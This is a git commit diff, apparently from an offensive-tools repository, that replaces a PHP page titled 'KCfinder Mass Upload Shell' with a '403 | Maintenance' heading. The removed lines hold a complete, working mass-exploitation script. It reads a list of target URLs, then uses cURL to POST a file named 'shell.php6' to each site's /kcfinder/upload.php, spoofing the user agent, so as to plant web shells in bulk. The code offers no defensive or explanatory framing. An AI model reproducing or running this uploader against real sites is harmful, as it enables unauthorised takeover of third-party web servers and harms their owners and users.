c1506b2c6c3dbff19423baab09b6150c60a12479
MarsHallSec <47811548+X-MarsHall@users.noreply.github.com>
2020-10-23 23:29:30 +0700

    Update kcfinder.php

--- tools/kcfinder.php
+++ tools/kcfinder.php
@@ -15,67 +15,8 @@
 
 <div class="container-fluid">
 <br><br><br>
-    <h1>KCfinder Mass Upload Shell</h1>
- <br>
-<center>
-    <form>
-  <div class="form-group">
-    <label for="exampleInputEmail1">Url Target :</label><br>
-    <textarea cols="55" id="ContactForm1_contact-form-email-message" name="url" placeholder="http://target.co/(patch)" rows="6"></textarea>
-
-    <br><br>
-  <button type="submit"  class="btn btn-primary">Submit</button>
-</form>
-</center>
-
-
-<?php
-
-if(isset($_GET['url'])){
-
-    $url = $_GET['url'];
-    $lis = explode("\n", $url);
-    
-    foreach($lis as $ht){
-    
-$target = "$ht/kcfinder/upload.php";           
-$shell = 'shell.php6';   
-$file = new CURLFile(realpath($shell));
-$up = array (
-        'file' => $file
-              );    
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $target);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_HEADER, 0);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");   
-    curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: multipart/form-data'));
-    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);   
-    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);  
-    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $up);
-
-    $result = curl_exec ($ch);
-
-    if ($result === FALSE) {
-
-        echo '<font color="#FF0000" Gagal Upload ' . $shell .  " " . curl_error($ch);
-        curl_close ($ch);
-
-    }else{
-        curl_close ($ch);
-        echo '<font color="#008000"> [+] ' .$ht.$result. '</font>';
-        echo "\n\n";
-
-    }
-    
-    }
-}
-?>
-
-
+    <h1>403 | Maintenance</h1>
+ 
 
 </div>
 
